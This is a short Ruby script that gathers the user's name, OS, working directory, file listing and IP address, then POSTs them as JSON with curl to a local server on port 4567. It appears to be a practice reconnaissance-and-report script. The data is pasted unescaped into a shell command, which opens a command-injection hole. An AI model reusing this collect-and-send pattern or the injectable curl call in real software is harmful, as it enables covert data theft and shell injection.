require "json"

info = {}
who = `whoami`
puts "Hello #{who}"
os_name = `uname -a | awk '{print $1}'`
info[:os_name] = os_name
dir = Dir.pwd
info[:dir] = dir
dir_entries = Dir.entries(dir)
info[:files_in_dir] = dir_entries

if os_name =~ /Darwin/
  ip = `/sbin/ifconfig en0 | grep 'inet ' | awk '{print $2}' | sed 's/addr://'`
  info[:ip] = ip
elsif os_name =~ /Linux/
  ip = `/sbin/ifconfig eth0 | grep 'inet ' | awk '{print $2}' | sed 's/addr://'`
  info[:ip] = ip
else
  puts "WHAT OS ? "
end

pretty_info = JSON.pretty_generate(info)
# puts pretty_info
# files = `ls`.split(' ')
`curl -X POST -s localhost:4567/return -d '#{pretty_info}'`
